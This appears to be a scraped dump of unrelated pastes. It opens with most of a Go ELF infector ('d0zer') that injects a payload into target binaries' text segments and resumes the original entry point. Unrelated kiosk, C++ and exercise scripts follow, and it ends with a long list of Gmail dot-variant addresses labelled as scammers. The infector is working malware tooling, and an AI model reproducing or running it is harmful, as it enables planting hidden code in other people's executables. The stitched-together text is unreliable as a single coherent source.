
	if h, ok := t.Hdr.(*elf.Header64); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, h); err != nil {
			return err
		}
	}

	if h, ok := t.Hdr.(*elf.Header32); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, h); err != nil {
			return err
		}
	}

	if p, ok := t.Phdrs.([]elf.Prog64); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, p); err != nil {
			return err
		}
	}

	if p, ok := t.Phdrs.([]elf.Prog32); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, p); err != nil {
			return err
		}
	}

	var ephdrsz int
	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		ephdrsz = int(t.Hdr.(*elf.Header64).Ehsize) + int(t.Hdr.(*elf.Header64).Phentsize * t.Hdr.(*elf.Header64).Phnum)
	case elf.ELFCLASS32:
		ephdrsz = int(t.Hdr.(*elf.Header32).Ehsize) + int(t.Hdr.(*elf.Header32).Phentsize * t.Hdr.(*elf.Header32).Phnum)
	}

	infected.Write(t.Contents[ephdrsz:])

	infectedShdrTable := new(bytes.Buffer)
	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		binary.Write(infectedShdrTable, t.EIdent.Endianness, t.Shdrs.([]elf.Section64))
	case elf.ELFCLASS32:
		binary.Write(infectedShdrTable, t.EIdent.Endianness, t.Shdrs.([]elf.Section32))
	}

	finalInfectionTwo := make([]byte, infected.Len() + int(PAGE_SIZE))
	finalInfection := infected.Bytes()

	var endOfInfection int
	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		copy(finalInfection[int(oShoff.(uint64)):], infectedShdrTable.Bytes())
		endOfInfection = int(textSegEnd.(uint64))
	case elf.ELFCLASS32:
		copy(finalInfection[int(oShoff.(uint32)):], infectedShdrTable.Bytes())
		endOfInfection = int(textSegEnd.(uint32))
	}

	copy(finalInfectionTwo, finalInfection[:endOfInfection])

	if debug {
		fmt.Println(""[+] writing payload into the binary"")
	}

	copy(finalInfectionTwo[endOfInfection:], t.Payload.Bytes())
	copy(finalInfectionTwo[endOfInfection + PAGE_SIZE:], finalInfection[endOfInfection:])
	infectedFileName := fmt.Sprintf(""%s-infected"", t.Fh.Name())

	if err := ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751); err != nil {
		return err
	}
	return nil
}

func (t *targetBin) writePreservationStub() {
	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		t.Payload.Write(preserve64)
	case elf.ELFCLASS32:
		t.Payload.Write(preserve32)
	}
}

func (t *targetBin) enumIdent() error {
	switch elf.Class(t.Ident[elf.EI_CLASS]) {
	case elf.ELFCLASS64:
		t.Hdr = new(elf.Header64)
		t.EIdent.Arch = elf.ELFCLASS64
	case elf.ELFCLASS32:
		t.Hdr = new(elf.Header32)
		t.EIdent.Arch = elf.ELFCLASS32
	default:
		return errors.New(""Invalid Arch supplied -- only x86 and x64 ELF binaries supported"")
	}

	switch elf.Data(t.Ident[elf.EI_DATA]) {
	case elf.ELFDATA2LSB:
		t.EIdent.Endianness = binary.LittleEndian
	case elf.ELFDATA2MSB:
		t.EIdent.Endianness = binary.BigEndian
	default:
		return errors.New(""Binary possibly corrupted -- byte order unknown"")
	}

	return nil
}

func (t *targetBin) mapHeader() error {
	h := bytes.NewReader(t.Contents)
	b := t.EIdent.Endianness

	switch a := t.EIdent.Arch; a {
	case elf.ELFCLASS64:
		t.Hdr = new(elf.Header64)
		if err := binary.Read(h, b, t.Hdr); err != nil {
			return err
		}
	case elf.ELFCLASS32:
		t.Hdr = new(elf.Header32)
		if err := binary.Read(h, b, t.Hdr); err != nil {
			return err
		}
	}
	return nil
}

func (t *targetBin) getSectionHeaders() error {
	if h, ok := t.Hdr.(*elf.Header64); ok {
		start := int(h.Shoff)
		end := int(h.Shentsize) * int(h.Shnum) + int(h.Shoff)
		sr := bytes.NewBuffer(t.Contents[start:end])
		t.Shdrs = make([]elf.Section64, h.Shnum)

		if err := binary.Read(sr, t.EIdent.Endianness, t.Shdrs.([]elf.Section64)); err != nil {
			return err
		}
	}

	if h, ok := t.Hdr.(*elf.Header32); ok {
		start := int(h.Shoff)
		end := int(h.Shentsize) * int(h.Shnum) + int(h.Shoff)
		sr := bytes.NewBuffer(t.Contents[start:end])
		t.Shdrs = make([]elf.Section32, h.Shnum)

		if err := binary.Read(sr, t.EIdent.Endianness, t.Shdrs.([]elf.Section32)); err != nil {
			return err
		}
	}

	return nil
}

func (t *targetBin) getProgramHeaders() error {
	if h, ok := t.Hdr.(*elf.Header64); ok {
		start := h.Phoff
		end := int(h.Phentsize) * int(h.Phnum) + int(h.Phoff)
		pr := bytes.NewBuffer(t.Contents[start:end])
		t.Phdrs = make([]elf.Prog64, h.Phnum)

		if err := binary.Read(pr, t.EIdent.Endianness, t.Phdrs.([]elf.Prog64)); err != nil {
			return err
		}
	}

	if h, ok := t.Hdr.(*elf.Header32); ok {
		start := h.Phoff
		end := int(h.Phentsize) * int(h.Phnum) + int(h.Phoff)
		pr := bytes.NewBuffer(t.Contents[start:end])
		t.Phdrs = make([]elf.Prog32, h.Phnum)

		if err := binary.Read(pr, t.EIdent.Endianness, t.Phdrs.([]elf.Prog32)); err != nil {
			return err
		}
	}

	return nil
}

func (t *targetBin) getFileContents() error {
	fStat, err := t.Fh.Stat()
	if err != nil {
		return err
	}

	t.Filesz = fStat.Size()
	t.Contents = make([]byte, t.Filesz)

	if _, err := t.Fh.Read(t.Contents); err != nil {
		return err
	}
	return nil
}

func main() {

	debug := flag.Bool(""debug"", false, ""see debug output (generated payload, modifications, etc)"")
	pEnv := flag.String(""payloadEnv"", """", ""name of the environmental variable holding the payload"")
	oFile := flag.String(""target"", """", ""path to binary targetted for infection"")
	pFile := flag.String(""payloadBin"", """", ""path to binary containing payload"")
	noPres := flag.Bool(""noPreserve"", false, ""prevents d0zer from prepending its register preservation routine to your payload"")
	noRest := flag.Bool(""noRestoration"", false, ""prevents d0zer from appending register restoration routine to your payload"")
	noRetOEP := flag.Bool(""noRetOEP"", false, ""prevents d0zer from appending ret-to-OEP (continue execution after payload) to payload"")
	flag.Parse()

	if *oFile == """" {
		flag.PrintDefaults()
		log.Fatal(""No target binary supplied"")
	}
	t := new(targetBin)

	fh, err := os.Open(*oFile)
	if err != nil {
		log.Fatal(err)
	}

	t.Fh = fh
	defer t.Fh.Close()

	if err := t.getFileContents(); err != nil {
		fmt.Println(err)
		return
	}

	if !t.isElf() {
		fmt.Println(""This is not an Elf binary"")
		return
	}

	if err := t.enumIdent(); err != nil {
		fmt.Println(err)
		return
	}

	if  *noPres == false {
		t.writePreservationStub()
	}

	switch {

	case *pEnv != """" && *pFile != """":
		flag.PrintDefaults()
		return

	case *pEnv == """" && *pFile == """":
		if t.EIdent.Arch == elf.ELFCLASS64 {
			t.Payload.Write(defaultPayload64)
		} else {
			t.Payload.Write(defaultPayload32)
		}

	case *pEnv != """":
		if _, err := getPayloadFromEnv(&t.Payload, *pEnv); err != nil {
			fmt.Println(err)
			return
		}

	case *pFile != """":
		fmt.Println(""Getting payload from an ELF binary .text segment is not yet supported"")
		return
	}

	if err := t.mapHeader(); err != nil {
		fmt.Println(err)
		return
	}

	if err := t.getSectionHeaders(); err != nil {
		fmt.Println(err)
		return
	}

	if err := t.getProgramHeaders(); err != nil {
		fmt.Println(err)
		return
	}

	if err := t.infectBinary(*debug, *noRest, *noRetOEP); err != nil {
		fmt.Println(err)
		return
	}
}"
NP2U7BNu,web_browser.py,metamorfolog,Python,Sunday 18th of June 2023 10:51:25 AM CDT,"import sys
from PySide2.QtCore import Qt, QUrl, QTimer
from PySide2.QtGui import QKeySequence
from PySide2.QtWidgets import QApplication, QMainWindow
from PySide2.QtWebEngineWidgets import QWebEngineView


class WebBrowserWindow(QMainWindow):
    def __init__(self, url):
        super().__init__()
        self.setWindowTitle(""Built-in Web Browser"")
        self.setWindowState(Qt.WindowFullScreen)

        self.webview = QWebEngineView()
        self.setCentralWidget(self.webview)

        self.webview.load(QUrl(url))

        self.show()

        self.timer = QTimer()
        self.timer.timeout.connect(self.refresh_page)
        self.timer.start(30000)  # 30 sekund (30000 ms)

    def keyPressEvent(self, event):
        if event.key() == Qt.Key_Q and event.modifiers() == Qt.ControlModifier:
            QApplication.quit()

    def refresh_page(self):
        self.webview.reload()


if __name__ == '__main__':
    app = QApplication(sys.argv)
    url = ""https://beachklub.isportsystem.cz/?_ga=2.20473712.91226455.1686776341-210341506.1686776341""
    browser_window = WebBrowserWindow(url)
    sys.exit(app.exec_())
"
SxtJxBxy,video_player.py,metamorfolog,Python,Sunday 18th of June 2023 10:50:47 AM CDT,"import cv2
import numpy as np
import ctypes


def play_fullscreen_video(video_path):
    # Vytvoření okna
    cv2.namedWindow(""BeachClub Pankrac"", cv2.WINDOW_NORMAL)
    cv2.setWindowProperty(""BeachClub Pankrac"",
                          cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)

    # Načtení videa
    video = cv2.VideoCapture(video_path)
    while True:
        # Přehrání videa snímek po snímku
        ret, frame = video.read()
        if not ret:
            break

        # Zvětšení snímku na velikost obrazovky
        # Úprava faktoru zvětšení dle potřeby
        frame = cv2.resize(frame, (0, 0), fx=0.5, fy=0.5)

        # Zobrazení snímku ve fullscreen okně
        cv2.imshow(""BeachClub Pankrac"", frame)

        # Kontrola klávesnice pro ukončení přehrávání (stisk klávesy ""q"")
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break

    # Uvolnění prostředků
    video.release()
    cv2.destroyAllWindows()


# Spuštění přehrání videa ve fullscreenu
video_path = ""video2.mp4""  # Upravte cestu k videu podle vašeho systému
play_fullscreen_video(video_path)
"
M7ELP96U,beachclub.py,metamorfolog,Python,Sunday 18th of June 2023 10:49:21 AM CDT,"import subprocess
import threading
import time

web_browser_process = None

def play_video(video_path):
    subprocess.call([""python"", ""video_player.py"", video_path])

def run_web_browser():
    global web_browser_process
    web_browser_process = subprocess.Popen([""python"", ""web_browser.py""])

def stop_web_browser():
    global web_browser_process
    if web_browser_process is not None:
        web_browser_process.terminate()
        web_browser_process = None

while True:
    # Spuštění přehrávače videa ve vlastním vlákně
    video_thread = threading.Thread(
        target=play_video, args=(""video2.mp4"",))
    video_thread.start()

    # Spuštění webového prohlížeče
    # Počkej 56 sekund
    time.sleep(56)
    run_web_browser()
    time.sleep(10)
    stop_web_browser()
"
967iDapD,Implementação Classe Ponto Cartesiano em Cpp,wagner-cipriano,C++,Sunday 18th of June 2023 10:44:03 AM CDT,"#include <iostream>
#include <math.h>
using namespace std;

class Ponto {
  //private:
    int x, y;

  public:
    Ponto(int a, int b) {
      x = a;
      y = b;
    }
    void setX(int v) {x = v;}
    int getX() {return x;}
    void setY(int v) {y = v;}
    int getY() {return y;}
    bool equals(Ponto c) {
      if(c.x == x  &&  c.y == y)
        return true;
      return false;
    }
    float distancia(Ponto c) {
      float r;
      r = sqrt(pow(x - c.x, 2) + pow(y - c.y, 2));
      return r;
    }
};


int main () {
  int p1x, p1y, p2x, p2y;
  cout << ""Informe os valores de x e y do ponto 1: "";
  cin >> p1x >> p1y;
  cout << ""Informe os valores de x e y do ponto 2: "";
  cin >> p2x >> p2y;
  Ponto *p = new Ponto(p1x, p1y);
  Ponto *q = new Ponto(p2x, p2y);
  //(*q).setX(2); (*q).setY(4);
  cout << ""\np("" << (*p).getX() << "","" << (*p).getY() << "")\nq("" << (*q).getX() << "","" << (*q).getY() << "")\n"";
  cout << ""p equals q:  "" << (*p).equals(*q) << endl;
  cout << ""p dist q:    "" << (*p).distancia(*q) << endl;

  return 0;
}
"
07EgWAUB,N11,Korotkodul,Python,Sunday 18th of June 2023 10:42:15 AM CDT,"f = open('24.txt')
s = f.readline()
f.close()

def d(x,y):
    global s
    s = s.replace(x,y)

d('A', 'X')
d('C', 'X')
d('D', 'X')
d('B', 'Y')
d('E', 'Y')
d('F', 'Y')

L = 1
R = len(s)
while L + 1 < R:
    M = (L + R) // 2
    if 'X' * M in s:
        L = M
    else:
        R = M
print(L)
"
d5sEXbkW,Nigerian scammers [28-6-1/2023],bombaires,HTML,Sunday 18th of June 2023 10:39:00 AM CDT,"<a href=""mailto:fergusonthemba@consultant.com"">fergusonthemba@consultant.com</a>
<a href=""mailto:tj1170255@gmail.com"">tj1170255@gmail.com</a>
<a href=""mailto:tj.1.170255@gmail.com"">tj.1.170255@gmail.com</a>
<a href=""mailto:tj1.1.7.0255@gmail.com"">tj1.1.7.0255@gmail.com</a>
<a href=""mailto:t.j1170.2.5.5@gmail.com"">t.j1170.2.5.5@gmail.com</a>
<a href=""mailto:tj1.170255@gmail.com"">tj1.170255@gmail.com</a>
<a href=""mailto:t.j.11.7.0.25.5@gmail.com"">t.j.11.7.0.25.5@gmail.com</a>
<a href=""mailto:tj117025.5@gmail.com"">tj117025.5@gmail.com</a>
<a href=""mailto:t.j11.7.0255@gmail.com"">t.j11.7.0255@gmail.com</a>
<a href=""mailto:t.j.11.702.5.5@gmail.com"">t.j.11.702.5.5@gmail.com</a>
<a href=""mailto:tj11.70.2.5.5@gmail.com"">tj11.70.2.5.5@gmail.com</a>
<a href=""mailto:tj1170.2.5.5@gmail.com"">tj1170.2.5.5@gmail.com</a>
<a href=""mailto:t.j1170255@gmail.com"">t.j1170255@gmail.com</a>
<a href=""mailto:t.j11.7.0.2.55@gmail.com"">t.j11.7.0.2.55@gmail.com</a>
<a href=""mailto:t.j.1.170.2.55@gmail.com"">t.j.1.170.2.55@gmail.com</a>
<a href=""mailto:tj11.702.5.5@gmail.com"">tj11.702.5.5@gmail.com</a>
<a href=""mailto:tj.1.1.70255@gmail.com"">tj.1.1.70255@gmail.com</a>
<a href=""mailto:tj.1.1702.55@gmail.com"">tj.1.1702.55@gmail.com</a>
<a href=""mailto:t.j1.1702.55@gmail.com"">t.j1.1702.55@gmail.com</a>
<a href=""mailto:tj11.7025.5@gmail.com"">tj11.7025.5@gmail.com</a>
<a href=""mailto:t.j1.1.70255@gmail.com"">t.j1.1.70255@gmail.com</a>
<a href=""mailto:t.j11.7.0.2.5.5@gmail.com"">t.j11.7.0.2.5.5@gmail.com</a>
<a href=""mailto:tj11702.5.5@gmail.com"">tj11702.5.5@gmail.com</a>
<a href=""mailto:t.j11.7.025.5@gmail.com"">t.j11.7.025.5@gmail.com</a>
<a href=""mailto:t.j.1170.255@gmail.com"">t.j.1170.255@gmail.com</a>
<a href=""mailto:t.j.1170.25.5@gmail.com"">t.j.1170.25.5@gmail.com</a>
<a href=""mailto:t.j117.0255@gmail.com"">t.j117.0255@gmail.com</a>
<a href=""mailto:tj1.1.7.0.2.55@gmail.com"">tj1.1.7.0.2.55@gmail.com</a>
<a href=""mailto:tj1.170.2.55@gmail.com"">tj1.170.2.55@gmail.com</a>
<a href=""mailto:t.j.117025.5@gmail.com"">t.j.117025.5@gmail.com</a>
<a href=""mailto:tj.11702.5.5@gmail.com"">tj.11702.5.5@gmail.com</a>
<a href=""mailto:t.j.1.17.0.255@gmail.com"">t.j.1.17.0.255@gmail.com</a>
<a href=""mailto:tj.11.7.0255@gmail.com"">tj.11.7.0255@gmail.com</a>
<a href=""mailto:t.j1170.25.5@gmail.com"">t.j1170.25.5@gmail.com</a>
<a href=""mailto:tj.11.7.0.255@gmail.com"">tj.11.7.0.255@gmail.com</a>
<a href=""mailto:t.j.11.7.02.55@gmail.com"">t.j.11.7.02.55@gmail.com</a>
<a href=""mailto:t.j1.1.7.0.2.55@gmail.com"">t.j1.1.7.0.2.55@gmail.com</a>
<a href=""mailto:tj1.17.02.5.5@gmail.com"">tj1.17.02.5.5@gmail.com</a>
<a href=""mailto:tj.117.0.255@gmail.com"">tj.117.0.255@gmail.com</a>
<a href=""mailto:tj.1.1.7.0.2.55@gmail.com"">tj.1.1.7.0.2.55@gmail.com</a>
<a href=""mailto:tj.1.17.025.5@gmail.com"">tj.1.17.025.5@gmail.com</a>
<a href=""mailto:t.j11.70.2.5.5@gmail.com"">t.j11.70.2.5.5@gmail.com</a>
<a href=""mailto:t.j.1.1.70255@gmail.com"">t.j.1.1.70255@gmail.com</a>
<a href=""mailto:tj.11.7.02.5.5@gmail.com"">tj.11.7.02.5.5@gmail.com</a>
<a href=""mailto:t.j117.0.255@gmail.com"">t.j117.0.255@gmail.com</a>
<a href=""mailto:t.j.1.1.70.255@gmail.com"">t.j.1.1.70.255@gmail.com</a>
<a href=""mailto:tj1170.255@gmail.com"">tj1170.255@gmail.com</a>
<a href=""mailto:t.j.11.7.0.2.55@gmail.com"">t.j.11.7.0.2.55@gmail.com</a>
<a href=""mailto:t.j.1.1.7.025.5@gmail.com"">t.j.1.1.7.025.5@gmail.com</a>
<a href=""mailto:tj.1.1.7025.5@gmail.com"">tj.1.1.7025.5@gmail.com</a>
<a href=""mailto:t.j117.025.5@gmail.com"">t.j117.025.5@gmail.com</a>
<a href=""mailto:tj.1.1.7.0.255@gmail.com"">tj.1.1.7.0.255@gmail.com</a>
<a href=""mailto:tj.1.1.7.025.5@gmail.com"">tj.1.1.7.025.5@gmail.com</a>
<a href=""mailto:t.j.117.0255@gmail.com"">t.j.117.0255@gmail.com</a>
<a href=""mailto:tj117.0255@gmail.com"">tj117.0255@gmail.com</a>
<a href=""mailto:tj11.70.2.55@gmail.com"">tj11.70.2.55@gmail.com</a>
<a href=""mailto:tj.11.7.025.5@gmail.com"">tj.11.7.025.5@gmail.com</a>
<a href=""mailto:t.j.1.1.70.25.5@gmail.com"">t.j.1.1.70.25.5@gmail.com</a>
<a href=""mailto:tj11702.55@gmail.com"">tj11702.55@gmail.com</a>
<a href=""mailto:tj117.0.25.5@gmail.com"">tj117.0.25.5@gmail.com</a>
<a href=""mailto:t.j.1.17.0.25.5@gmail.com"">t.j.1.17.0.25.5@gmail.com</a>
<a href=""mailto:t.j1.17.0.25.5@gmail.com"">t.j1.17.0.25.5@gmail.com</a>
<a href=""mailto:t.j1.1.70.2.55@gmail.com"">t.j1.1.70.2.55@gmail.com</a>
<a href=""mailto:t.j1.1.7.0.25.5@gmail.com"">t.j1.1.7.0.25.5@gmail.com</a>
<a href=""mailto:tj.11702.55@gmail.com"">tj.11702.55@gmail.com</a>
<a href=""mailto:t.j.11.7.025.5@gmail.com"">t.j.11.7.025.5@gmail.com</a>
<a href=""mailto:tj11.70255@gmail.com"">tj11.70255@gmail.com</a>
<a href=""mailto:t.j1.170.2.5.5@gmail.com"">t.j1.170.2.5.5@gmail.com</a>
<a href=""mailto:tj.1.17.02.5.5@gmail.com"">tj.1.17.02.5.5@gmail.com</a>
<a href=""mailto:tj1.1702.5.5@gmail.com"">tj1.1702.5.5@gmail.com</a>
<a href=""mailto:t.j.11.70.25.5@gmail.com"">t.j.11.70.25.5@gmail.com</a>
<a href=""mailto:tj.11.70.2.55@gmail.com"">tj.11.70.2.55@gmail.com</a>
<a href=""mailto:t.j.1.1.7025.5@gmail.com"">t.j.1.1.7025.5@gmail.com</a>
<a href=""mailto:t.j1.17.0.2.55@gmail.com"">t.j1.17.0.2.55@gmail.com</a>
<a href=""mailto:t.j1.17025.5@gmail.com"">t.j1.17025.5@gmail.com</a>
<a href=""mailto:tj1.1.70.25.5@gmail.com"">tj1.1.70.25.5@gmail.com</a>
<a href=""mailto:t.j.117.025.5@gmail.com"">t.j.117.025.5@gmail.com</a>
<a href=""mailto:tj.117.025.5@gmail.com"">tj.117.025.5@gmail.com</a>
<a href=""mailto:t.j11.7.0.255@gmail.com"">t.j11.7.0.255@gmail.com</a>
<a href=""mailto:t.j.117.0.25.5@gmail.com"">t.j.117.0.25.5@gmail.com</a>
<a href=""mailto:t.j11702.55@gmail.com"">t.j11702.55@gmail.com</a>
<a href=""mailto:t.j.117.0.255@gmail.com"">t.j.117.0.255@gmail.com</a>
<a href=""mailto:t.j.1.1.7.0255@gmail.com"">t.j.1.1.7.0255@gmail.com</a>
<a href=""mailto:tj.1.1.70.2.5.5@gmail.com"">tj.1.1.70.2.5.5@gmail.com</a>
<a href=""mailto:t.j.11.70255@gmail.com"">t.j.11.70255@gmail.com</a>
<a href=""mailto:t.j.1.170255@gmail.com"">t.j.1.170255@gmail.com</a>
<a href=""mailto:t.j.11.702.55@gmail.com"">t.j.11.702.55@gmail.com</a>
<a href=""mailto:tj.11.70.2.5.5@gmail.com"">tj.11.70.2.5.5@gmail.com</a>
<a href=""mailto:tj.1.170.2.5.5@gmail.com"">tj.1.170.2.5.5@gmail.com</a>
<a href=""mailto:tj.117.02.55@gmail.com"">tj.117.02.55@gmail.com</a>
<a href=""mailto:tj1170.25.5@gmail.com"">tj1170.25.5@gmail.com</a>
<a href=""mailto:tj.1.1.7.02.5.5@gmail.com"">tj.1.1.7.02.5.5@gmail.com</a>
<a href=""mailto:t.j1.17.025.5@gmail.com"">t.j1.17.025.5@gmail.com</a>
<a href=""mailto:t.j.117.0.2.5.5@gmail.com"">t.j.117.0.2.5.5@gmail.com</a>
<a href=""mailto:t.j.117.02.5.5@gmail.com"">t.j.117.02.5.5@gmail.com</a>
<a href=""mailto:t.j1170.2.55@gmail.com"">t.j1170.2.55@gmail.com</a>
<a href=""mailto:tj.1.17.0255@gmail.com"">tj.1.17.0255@gmail.com</a>
<a href=""mailto:t.j.1.170.255@gmail.com"">t.j.1.170.255@gmail.com</a>
<a href=""mailto:t.j1.17.0.2.5.5@gmail.com"">t.j1.17.0.2.5.5@gmail.com</a>
<a href=""mailto:t.j1.17.0255@gmail.com"">t.j1.17.0255@gmail.com</a>
<a href=""mailto:tj.117.0.2.5.5@gmail.com"">tj.117.0.2.5.5@gmail.com</a>
<a href=""mailto:t.j1.1702.5.5@gmail.com"">t.j1.1702.5.5@gmail.com</a>
<a href=""mailto:tj.11.7.0.25.5@gmail.com"">tj.11.7.0.25.5@gmail.com</a>
<a href=""mailto:t.j.1.1.7.0.255@gmail.com"">t.j.1.1.7.0.255@gmail.com</a>
<a href=""mailto:tj.1170.2.55@gmail.com"">tj.1170.2.55@gmail.com</a>
<a href=""mailto:t.j11.702.55@gmail.com"">t.j11.702.55@gmail.com</a>
<a href=""mailto:t.j.1.17.0.2.5.5@gmail.com"">t.j.1.17.0.2.5.5@gmail.com</a>
<a href=""mailto:tj11.702.55@gmail.com"">tj11.702.55@gmail.com</a>
<a href=""mailto:t.j117.0.25.5@gmail.com"">t.j117.0.25.5@gmail.com</a>
<a href=""mailto:t.j.117.0.2.55@gmail.com"">t.j.117.0.2.55@gmail.com</a>
<a href=""mailto:tj.1.17.0.2.5.5@gmail.com"">tj.1.17.0.2.5.5@gmail.com</a>
<a href=""mailto:tj1.170.25.5@gmail.com"">tj1.170.25.5@gmail.com</a>
<a href=""mailto:t.j11.7.0.25.5@gmail.com"">t.j11.7.0.25.5@gmail.com</a>
<a href=""mailto:tj11.7.0.25.5@gmail.com"">tj11.7.0.25.5@gmail.com</a>
<a href=""mailto:tj1.17.02.55@gmail.com"">tj1.17.02.55@gmail.com</a>
<a href=""mailto:t.j.11.7025.5@gmail.com"">t.j.11.7025.5@gmail.com</a>
<a href=""mailto:tj.11.7.02.55@gmail.com"">tj.11.7.02.55@gmail.com</a>
<a href=""mailto:t.j.1170.2.55@gmail.com"">t.j.1170.2.55@gmail.com</a>
<a href=""mailto:tj11.7.025.5@gmail.com"">tj11.7.025.5@gmail.com</a>
<a href=""mailto:t.j.1.17.0255@gmail.com"">t.j.1.17.0255@gmail.com</a>
<a href=""mailto:t.j.11702.55@gmail.com"">t.j.11702.55@gmail.com</a>
<a href=""mailto:t.j.11702.5.5@gmail.com"">t.j.11702.5.5@gmail.com</a>
<a href=""mailto:t.j.1.1.7.0.2.5.5@gmail.com"">t.j.1.1.7.0.2.5.5@gmail.com</a>
<a href=""mailto:t.j1.1.70.2.5.5@gmail.com"">t.j1.1.70.2.5.5@gmail.com</a>
<a href=""mailto:tj117.0.2.5.5@gmail.com"">tj117.0.2.5.5@gmail.com</a>
<a href=""mailto:tj1.1.7.0.2.5.5@gmail.com"">tj1.1.7.0.2.5.5@gmail.com</a>
<a href=""mailto:tj117.02.55@gmail.com"">tj117.02.55@gmail.com</a>
<a href=""mailto:tj.1.1.7.0255@gmail.com"">tj.1.1.7.0255@gmail.com</a>
<a href=""mailto:t.j.1.1.7.02.5.5@gmail.com"">t.j.1.1.7.02.5.5@gmail.com</a>
<a href=""mailto:t.j.1.17.02.55@gmail.com"">t.j.1.17.02.55@gmail.com</a>
<a href=""mailto:t.j1.1.7025.5@gmail.com"">t.j1.1.7025.5@gmail.com</a>
<a href=""mailto:tj11.70.255@gmail.com"">tj11.70.255@gmail.com</a>
<a href=""mailto:tj.1.1.7.0.25.5@gmail.com"">tj.1.1.7.0.25.5@gmail.com</a>
<a href=""mailto:tj.1.1.7.02.55@gmail.com"">tj.1.1.7.02.55@gmail.com</a>
<a href=""mailto:tj.117.0.25.5@gmail.com"">tj.117.0.25.5@gmail.com</a>
<a href=""mailto:tj1.17.0.255@gmail.com"">tj1.17.0.255@gmail.com</a>
<a href=""mailto:t.j117.02.5.5@gmail.com"">t.j117.02.5.5@gmail.com</a>
<a href=""mailto:t.j.1.1.7.02.55@gmail.com"">t.j.1.1.7.02.55@gmail.com</a>
<a href=""mailto:t.j1.1.702.55@gmail.com"">t.j1.1.702.55@gmail.com</a>
<a href=""mailto:t.j.1.1.7.0.2.55@gmail.com"">t.j.1.1.7.0.2.55@gmail.com</a>
<a href=""mailto:t.j1.1.70.255@gmail.com"">t.j1.1.70.255@gmail.com</a>
<a href=""mailto:tj.1.170.2.55@gmail.com"">tj.1.170.2.55@gmail.com</a>
<a href=""mailto:t.j.1.17.02.5.5@gmail.com"">t.j.1.17.02.5.5@gmail.com</a>
<a href=""mailto:t.j.1.17025.5@gmail.com"">t.j.1.17025.5@gmail.com</a>
<a href=""mailto:t.j1.1.7.02.5.5@gmail.com"">t.j1.1.7.02.5.5@gmail.com</a>
<a href=""mailto:tj117.025.5@gmail.com"">tj117.025.5@gmail.com</a>
<a href=""mailto:t.j.1.170.25.5@gmail.com"">t.j.1.170.25.5@gmail.com</a>
<a href=""mailto:tj117.0.2.55@gmail.com"">tj117.0.2.55@gmail.com</a>
<a href=""mailto:tj11.7.02.5.5@gmail.com"">tj11.7.02.5.5@gmail.com</a>
<a href=""mailto:tj1.17.0.2.55@gmail.com"">tj1.17.0.2.55@gmail.com</a>
<a href=""mailto:t.j117025.5@gmail.com"">t.j117025.5@gmail.com</a>
<a href=""mailto:t.j.1170255@gmail.com"">t.j.1170255@gmail.com</a>
<a href=""mailto:tj.1.17.02.55@gmail.com"">tj.1.17.02.55@gmail.com</a>
<a href=""mailto:tj.1.17.0.25.5@gmail.com"">tj.1.17.0.25.5@gmail.com</a>
<a href=""mailto:tj1.17.0.2.5.5@gmail.com"">tj1.17.0.2.5.5@gmail.com</a>
<a href=""mailto:t.j11.702.5.5@gmail.com"">t.j11.702.5.5@gmail.com</a>
<a href=""mailto:t.j117.0.2.5.5@gmail.com"">t.j117.0.2.5.5@gmail.com</a>
<a href=""mailto:tj.11.70.25.5@gmail.com"">tj.11.70.25.5@gmail.com</a>
<a href=""mailto:tj1.1.7.02.55@gmail.com"">tj1.1.7.02.55@gmail.com</a>
<a href=""mailto:tj1.1.70.2.55@gmail.com"">tj1.1.70.2.55@gmail.com</a>
<a href=""mailto:tj.1.170.25.5@gmail.com"">tj.1.170.25.5@gmail.com</a>
<a href=""mailto:tj1.170.2.5.5@gmail.com"">tj1.170.2.5.5@gmail.com</a>
<a href=""mailto:tj.1.17.0.255@gmail.com"">tj.1.17.0.255@gmail.com</a>
<a href=""mailto:tj117.02.5.5@gmail.com"">tj117.02.5.5@gmail.com</a>
<a href=""mailto:t.j11.7025.5@gmail.com"">t.j11.7025.5@gmail.com</a>
<a href=""mailto:t.j.1.1.702.55@gmail.com"">t.j.1.1.702.55@gmail.com</a>
<a href=""mailto:tj.11.70.255@gmail.com"">tj.11.70.255@gmail.com</a>
<a href=""mailto:tj.1170.2.5.5@gmail.com"">tj.1170.2.5.5@gmail.com</a>
<a href=""mailto:tj.11.702.5.5@gmail.com"">tj.11.702.5.5@gmail.com</a>
<a href=""mailto:t.j1.17.0.255@gmail.com"">t.j1.17.0.255@gmail.com</a>
<a href=""mailto:tj1.17.0.25.5@gmail.com"">tj1.17.0.25.5@gmail.com</a>
<a href=""mailto:tj.1.1702.5.5@gmail.com"">tj.1.1702.5.5@gmail.com</a>
<a href=""mailto:t.j11.70.2.55@gmail.com"">t.j11.70.2.55@gmail.com</a>
<a href=""mailto:t.j11.7.02.55@gmail.com"">t.j11.7.02.55@gmail.com</a>
<a href=""mailto:t.j1170.255@gmail.com"">t.j1170.255@gmail.com</a>
<a href=""mailto:tj.1.1.70.255@gmail.com"">tj.1.1.70.255@gmail.com</a>
<a href=""mailto:t.j1.1.7.0.2.5.5@gmail.com"">t.j1.1.7.0.2.5.5@gmail.com</a>
<a href=""mailto:tj11.7.02.55@gmail.com"">tj11.7.02.55@gmail.com</a>
<a href=""mailto:tj1.1.70.255@gmail.com"">tj1.1.70.255@gmail.com</a>
<a href=""mailto:t.j.11.7.0.255@gmail.com"">t.j.11.7.0.255@gmail.com</a>
<a href=""mailto:tj.11.70255@gmail.com"">tj.11.70255@gmail.com</a>
<a href=""mailto:tj1.1702.55@gmail.com"">tj1.1702.55@gmail.com</a>
<a href=""mailto:t.j11702.5.5@gmail.com"">t.j11702.5.5@gmail.com</a>
<a href=""mailto:t.j.1.17.025.5@gmail.com"">t.j.1.17.025.5@gmail.com</a>
<a href=""mailto:t.j1.1.7.025.5@gmail.com"">t.j1.1.7.025.5@gmail.com</a>
<a href=""mailto:tj1.17025.5@gmail.com"">tj1.17025.5@gmail.com</a>
<a href=""mailto:t.j1.170.25.5@gmail.com"">t.j1.170.25.5@gmail.com</a>
